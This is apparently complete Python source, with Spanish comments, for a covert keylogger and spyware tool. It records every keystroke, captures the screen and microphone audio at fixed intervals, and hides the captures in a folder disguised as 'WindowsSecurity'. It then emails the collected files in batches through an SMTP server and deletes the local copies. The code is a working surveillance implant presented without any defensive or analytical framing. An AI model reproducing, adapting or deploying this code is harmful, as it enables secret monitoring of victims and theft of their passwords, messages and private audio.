import smtplib
import os
import threading
import time
import sys
import wave
import logging
import sounddevice as sd
import numpy as np
import zipfile
import pyscreenshot as ImageGrab
from PIL import Image
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from pynput import keyboard
from pynput.keyboard import Key, KeyCode

USERNAME = "YOUR_USERNAME"
PASSWORD = "YOUR_PASSWORD"

## Configuracion ##
INTERVALO_AUDIO = 60 # segundos
INTERVALO_SCREENSHOT = 60 # segundos
DURACION_AUDIO = 15 # segundos por grabacion
MAX_TAMANO_BYTES = 5 * 1024 * 1024  # 5 MB

# Carpeta silenciosa.

appdata = os.getenv("APPDATA")
if appdata is None:
    appdata = os.path.expanduser("~")

BASE_DIR = os.path.join(appdata, "WindowsSecurity")

CAPTURA_DIR = "capturas"
LOGS_DIR = "logs"

CAPTURA_DIR = os.path.join(BASE_DIR, "capturas")
LOGS_DIR = os.path.join(BASE_DIR, "logs")

LOG_FILE = os.path.join(LOGS_DIR, "analitycs.txt")

## Crear caarpetas si no existen ##
os.makedirs(CAPTURA_DIR, exist_ok=True)
os.makedirs(LOGS_DIR, exist_ok=True)


# Logging inicial

logging.basicConfig(filename=LOG_FILE, level=logging.DEBUG, format='%(asctime)s: %(message)s')

def reiniciar_logging():
    logging.shutdown()
    with open(LOG_FILE, "w"): pass  # Crea archivo vacío
    logging.basicConfig(filename=LOG_FILE, level=logging.DEBUG, format='%(asctime)s: %(message)s')


## Teclado ##

pressed_keys = set()

def save_keys(key):
    try:
        if hasattr(key, 'char') and key.char:
            logging.info(f"{key.char}")
        else:
            logging.info(f"[{key}]")
    except Exception:
        pass

    pressed_keys.add(key)

    # Detectar combinación secreta Ctrl + Q (más simple)
    if (Key.alt_l in pressed_keys or Key.alt_r in pressed_keys) and \
       (KeyCode.from_char('q') in pressed_keys or KeyCode.from_char('Q') in pressed_keys):

        print("🔐 Combinación Ctrl+Q detectada. Enviando reporte final...")

        try:
            screen_files = [os.path.join(CAPTURA_DIR, f) for f in os.listdir(CAPTURA_DIR) if f.startswith("screen_")]
            audio_files = [os.path.join(CAPTURA_DIR, f) for f in os.listdir(CAPTURA_DIR) if f.startswith("audio_")]
            otros_logs = [LOG_FILE] if os.path.exists(LOG_FILE) else []

            archivos = otros_logs + screen_files + audio_files
            lotes = preparar_archivos_para_envio(archivos, usar_zip=False)

            for lote in lotes:
                send_file_for_mailtrap(lote)
        except Exception as e:
            print("❌ Error al enviar reporte final:", e)

        send_message_alert("Keylogger detenido", "El script fue detenido con la combinación Ctrl+Q.")
        print("🛑 Script detenido por combinación Ctrl+Q.")
        os._exit(0)

def on_release(key):
    if key in pressed_keys:
        pressed_keys.remove(key)

## Pantalla ## 

def capture_screen():
    contador = 1
    while True:
        imagen = ImageGrab.grab()
        path = os.path.join(CAPTURA_DIR, f"screen_{contador:03d}.png")
        imagen.save(path) # type: ignore
        print(f"Captura de pantalla guardada: {path}")
        contador += 1
        time.sleep(INTERVALO_SCREENSHOT)

## Audio ##

def record_audio():
    contador = 1
    while True:
        fs = 44100
        print(f"Grabando audio {contador}...")
        audio = sd.rec(int(DURACION_AUDIO * fs), samplerate=fs, channels=1)
        sd.wait()

        audio_np = np.array(audio * 32767, dtype=np.int16)
        archivo = os.path.join(CAPTURA_DIR, f"audio_{contador:03d}.wav")
        with wave.open(archivo, "wb") as wf:
            wf.setnchannels(1)
            wf.setsampwidth(2)
            wf.setframerate(fs)
            wf.writeframes(audio_np.tobytes())

        print(f"Audido guardado: {archivo}")
        contador += 1
        time.sleep(INTERVALO_AUDIO)



# Madar mensaje de alerta.
def send_message_alert(asunto, mensaje):
    sender = "Private person <from@example.com>"
    receiver = "A Test User <to@example.com>"

    msg = MIMEMultipart()
    msg["From"] = sender
    msg["To"] = receiver
    msg["Subject"] = asunto
    msg["Message"] = mensaje

    msg.attach(MIMEBase('text', 'plain'))
    

    try:
        with smtplib.SMTP("sandbox.smtp.mailtrap.io", 2525) as servidor:
            servidor.starttls()
            servidor.login(USERNAME, PASSWORD)
            servidor.send_message(msg)
        print("📧 Mensaje de detención enviado.")
    except Exception as e:
        print("❌ Error al enviar mensaje de alerta:", e)


## Enviar archivos a mailtrap.
def send_file_for_mailtrap(archivos):
    sender = "Private person <from@example.com>"
    receiver = "A Test USer <to@example.com>"

    msg = MIMEMultipart()
    msg["From"] = sender
    msg["To"] = receiver
    msg['Subject'] = "reporte"

    for archivo in archivos:
        if not os.path.exists(archivo): continue
        part = MIMEBase('application', 'octet-stream')
        with open(archivo, 'rb') as f:
            part.set_payload(f.read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', f'attachment; filename={os.path.basename(archivo)}')
        msg.attach(part)

    try:
        with smtplib.SMTP("sandbox.smtp.mailtrap.io", 2525) as servidor:
            servidor.starttls()
            servidor.login(USERNAME, PASSWORD)
            servidor.send_message(msg)
        print("Correo enviado con exito.")

        return True
    except Exception as e:
        print("Error al enviar correo:", e)
        return False
    
    
    
## Preparar archivos para envio ##
def preparar_archivos_para_envio(archivos, usar_zip=True):
    archivos_validos = [f for f in archivos if os.path.exists(f)]
    archivos_filtrados = []

    for archivo in archivos_validos:
        tam = os.path.getsize(archivo)
        if tam <= MAX_TAMANO_BYTES:
            archivos_filtrados.append(archivo)
        else:
            print(f"⚠️ El archivo '{archivo}' excede los 5MB y será omitido.")

    lotes = []
    lote_actual = []
    tamano_actual = 0
    lote_id = 1
    timestamp = int(time.time())

    for archivo in archivos_filtrados:
        tam = os.path.getsize(archivo)
        if tamano_actual + tam > MAX_TAMANO_BYTES:
            lotes.append(lote_actual)
            lote_actual = [archivo]
            tamano_actual = tam
        else:
            lote_actual.append(archivo)
            tamano_actual += tam

    if lote_actual:
        lotes.append(lote_actual)

    if usar_zip:
        zip_lotes = []
        for i, lote in enumerate(lotes, 1):
            nombre_zip = os.path.join(BASE_DIR, f"reporte_{timestamp}_{i}.zip")
            with zipfile.ZipFile(nombre_zip, 'w') as zipf:
                for archivo in lote:
                    zipf.write(archivo, os.path.basename(archivo))
            zip_lotes.append([nombre_zip])
        return zip_lotes
    else:
        return lotes

## Enviar cada X minutos.
def send_report_perio():
    while True:
        try:
            screen_files = [os.path.join(CAPTURA_DIR, f) for f in os.listdir(CAPTURA_DIR) if f.startswith("screen_")]
            audio_files = [os.path.join(CAPTURA_DIR, f) for f in os.listdir(CAPTURA_DIR) if f.startswith("audio_")]
            otros_logs = [LOG_FILE] if os.path.exists(LOG_FILE) else []

            if not otros_logs or not screen_files or not audio_files:
                print("⏳ Esperando a tener al menos un archivo de cada tipo (txt, audio, captura)...")
                time.sleep(10)
                continue

            archivos = otros_logs + screen_files + audio_files

            lotes = preparar_archivos_para_envio(archivos, usar_zip=True)  # o usar_zip=False según prefieras

            for lote in lotes:
                if send_file_for_mailtrap(lote):
    # Eliminar archivos enviados
                    for archivo in lote:
                        try:
                            os.remove(archivo)
                            print(f"🧹 ZIP eliminado: {archivo}")
                        except Exception as e:
                            print(f"❌ No se pudo eliminar {archivo}: {e}")

    # ✅ Limpiar capturas
                        for f in os.listdir(CAPTURA_DIR):
                            ruta = os.path.join(CAPTURA_DIR, f)
                            try:
                                os.remove(ruta)
                                print(f"🧹 Archivo de captura eliminado: {ruta}")
                            except Exception as e:
                                print(f"❌ No se pudo eliminar {ruta}: {e}")

    # ✅ Limpiar logs (excepto si justo se reinició)
                        for f in os.listdir(LOGS_DIR):
                            ruta = os.path.join(LOGS_DIR, f)
                            if ruta != LOG_FILE:  # Evitar conflicto con el logging activo
                                try:
                                    os.remove(ruta)
                                    print(f"🧹 Archivo de log eliminado: {ruta}")
                                except Exception as e:
                                    print(f"❌ No se pudo eliminar {ruta}: {e}")


                    # Reiniciar logging después de eliminar el archivo de texto
                    if LOG_FILE in lote:
                        reiniciar_logging()
                else:
                    print("⚠️ El correo no se envió. Archivos conservados para el próximo intento.")

        except Exception as e:
            print("❌ Error en proceso de envío:", e)

        time.sleep(60)  # Cada 1 minutos

## Obtener ultimo archivo.

def get_last_file(carpeta, prefijo):
    archivos = [f for f in os.listdir(carpeta) if f.startswith(prefijo)]
    if not archivos:
        return None
    archivos.sort()
    return os.path.join(carpeta, archivos[-1])

## ===== EJEUCION ===== ##

def main():
    threading.Thread(target=send_report_perio, daemon=True).start()
    # Iniciar captura de pantalla en segundo plano.
    threading.Thread(target=capture_screen, daemon=True).start()
    # Iniciar grabacopm de audio en segundo plano.
    threading.Thread(target=record_audio, daemon=True).start()
    # Iniciar escucha de teclado.
    with keyboard.Listener(on_press=save_keys, on_release=on_release) as listener:
        listener.join()


if __name__ == "__main__":
    main()